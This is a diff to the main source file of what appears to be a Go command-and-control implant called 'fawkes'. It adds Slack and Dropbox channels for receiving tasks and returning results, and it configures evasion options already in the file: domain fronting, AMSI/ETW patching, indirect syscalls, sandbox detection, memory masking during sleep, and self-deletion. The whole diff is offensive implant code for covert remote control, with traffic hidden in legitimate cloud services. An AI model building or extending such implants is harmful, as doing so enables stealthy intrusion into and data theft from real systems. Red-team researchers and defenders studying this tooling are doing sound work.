@@ -22,10 +22,12 @@ import (
 	"github.com/google/uuid"
 
 	"fawkes/pkg/commands"
+	"fawkes/pkg/dropbox"
 	"fawkes/pkg/files"
 	"fawkes/pkg/http"
 	"fawkes/pkg/profiles"
 	"fawkes/pkg/rpfwd"
+	"fawkes/pkg/slack"
 	"fawkes/pkg/socks"
 	"fawkes/pkg/structs"
 	"fawkes/pkg/tcp"
@@ -33,38 +35,47 @@ import (
 
 var (
 	// These variables are populated at build time by the Go linker
-	payloadUUID       string = ""
-	callbackHost      string = ""
-	callbackPort      string = "443"
-	userAgent         string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
-	sleepInterval     string = "10"
-	jitter            string = "10"
-	encryptionKey     string = ""
-	killDate          string = "0"
-	maxRetries        string = "10"
-	debug             string = "false"
-	getURI            string = "/data"
-	postURI           string = "/data"
-	hostHeader        string = ""     // Override Host header for domain fronting
-	proxyURL          string = ""     // HTTP/SOCKS proxy URL (e.g., http://proxy:8080)
-	tlsVerify         string = "none" // TLS verification: none, system-ca, pinned:<fingerprint>
-	workingHoursStart string = ""     // Working hours start (HH:MM, 24hr local time)
-	workingHoursEnd   string = ""     // Working hours end (HH:MM, 24hr local time)
-	workingDays       string = ""     // Active days (1-7, Mon=1, Sun=7, comma-separated)
-	tcpBindAddress    string = ""     // TCP P2P bind address (e.g., "0.0.0.0:7777"). Empty = HTTP egress mode.
-	envKeyHostname    string = ""     // Environment key: hostname must match this regex
-	envKeyDomain      string = ""     // Environment key: domain must match this regex
-	envKeyUsername    string = ""     // Environment key: username must match this regex
-	envKeyProcess     string = ""     // Environment key: this process must be running
-	selfDelete        string = ""     // Self-delete binary from disk after execution starts
-	masqueradeName    string = ""     // Process name masquerade (Linux: prctl PR_SET_NAME)
-	customHeaders     string = ""     // Base64-encoded JSON of additional HTTP headers
-	autoPatch         string = ""     // Auto-patch ETW and AMSI at startup (Windows only)
-	blockDLLs         string = ""     // Block non-Microsoft DLLs in child processes (Windows only)
-	indirectSyscalls  string = ""     // Enable indirect syscalls at startup (Windows only)
-	xorKey            string = ""     // Base64 XOR key for C2 string deobfuscation (empty = plaintext)
-	sandboxGuard      string = ""     // Detect sleep skipping (sandbox fast-forward) and exit silently
-	sleepMask         string = ""     // Encrypt sensitive agent/C2 data in memory during sleep cycles
+	payloadUUID          string = ""
+	callbackHost         string = ""
+	callbackPort         string = "443"
+	userAgent            string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"
+	sleepInterval        string = "10"
+	jitter               string = "10"
+	encryptionKey        string = ""
+	killDate             string = "0"
+	maxRetries           string = "10"
+	debug                string = "false"
+	getURI               string = "/data"
+	postURI              string = "/data"
+	hostHeader           string = ""     // Override Host header for domain fronting
+	proxyURL             string = ""     // HTTP/SOCKS proxy URL (e.g., http://proxy:8080)
+	tlsVerify            string = "none" // TLS verification: none, system-ca, pinned:<fingerprint>
+	workingHoursStart    string = ""     // Working hours start (HH:MM, 24hr local time)
+	workingHoursEnd      string = ""     // Working hours end (HH:MM, 24hr local time)
+	workingDays          string = ""     // Active days (1-7, Mon=1, Sun=7, comma-separated)
+	tcpBindAddress       string = ""     // TCP P2P bind address (e.g., "0.0.0.0:7777"). Empty = HTTP egress mode.
+	transportType        string = "http" // Transport profile: http, tcp, slack, dropbox
+	slackBotToken        string = ""     // Slack bot OAuth token
+	slackChannelID       string = ""     // Slack channel or DM ID
+	slackPollInterval    string = "5"    // Slack polling interval seconds
+	dropboxToken         string = ""     // Dropbox OAuth access token
+	dropboxTaskFolder    string = ""     // Dropbox folder to read inbound instruction files
+	dropboxResultFolder  string = ""     // Dropbox folder to write outbound result files
+	dropboxArchiveFolder string = ""     // Dropbox folder to move processed instruction files
+	dropboxPollInterval  string = "5"    // Dropbox polling interval seconds
+	envKeyHostname       string = ""     // Environment key: hostname must match this regex
+	envKeyDomain         string = ""     // Environment key: domain must match this regex
+	envKeyUsername       string = ""     // Environment key: username must match this regex
+	envKeyProcess        string = ""     // Environment key: this process must be running
+	selfDelete           string = ""     // Self-delete binary from disk after execution starts
+	masqueradeName       string = ""     // Process name masquerade (Linux: prctl PR_SET_NAME)
+	customHeaders        string = ""     // Base64-encoded JSON of additional HTTP headers
+	autoPatch            string = ""     // Auto-patch ETW and AMSI at startup (Windows only)
+	blockDLLs            string = ""     // Block non-Microsoft DLLs in child processes (Windows only)
+	indirectSyscalls     string = ""     // Enable indirect syscalls at startup (Windows only)
+	xorKey               string = ""     // Base64 XOR key for C2 string deobfuscation (empty = plaintext)
+	sandboxGuard         string = ""     // Detect sleep skipping (sandbox fast-forward) and exit silently
+	sleepMask            string = ""     // Encrypt sensitive agent/C2 data in memory during sleep cycles
 )
 
 func main() {
@@ -217,13 +228,25 @@ func runAgent() {
 	// Initialize C2 profile based on configuration
 	var c2 profiles.Profile
 
-	if tcpBindAddress != "" {
+	transport := strings.ToLower(strings.TrimSpace(transportType))
+	if transport == "" {
+		transport = "http"
+	}
+	if transport == "tcp" || tcpBindAddress != "" {
 		// TCP P2P mode — this agent is a child that listens for a parent connection
 		log.Printf("[INFO] TCP P2P mode: binding to %s", tcpBindAddress)
 		tcpProfile := tcp.NewTCPProfile(tcpBindAddress, encryptionKey, debugBool)
 		c2 = profiles.NewTCPProfile(tcpProfile)
 		// Make TCP profile available to link/unlink commands
 		commands.SetTCPProfile(tcpProfile)
+	} else if transport == "slack" {
+		pollInterval, _ := strconv.Atoi(slackPollInterval)
+		slackProfile := slack.NewSlackProfile(slackBotToken, slackChannelID, encryptionKey, pollInterval, debugBool)
+		c2 = profiles.NewSlackProfile(slackProfile)
+	} else if transport == "dropbox" {
+		pollInterval, _ := strconv.Atoi(dropboxPollInterval)
+		dropboxProfile := dropbox.NewDropboxProfile(dropboxToken, dropboxTaskFolder, dropboxResultFolder, dropboxArchiveFolder, encryptionKey, pollInterval, debugBool)
+		c2 = profiles.NewDropboxProfile(dropboxProfile)
 	} else {
 		// HTTP egress mode (default)
 		var callbackURL string
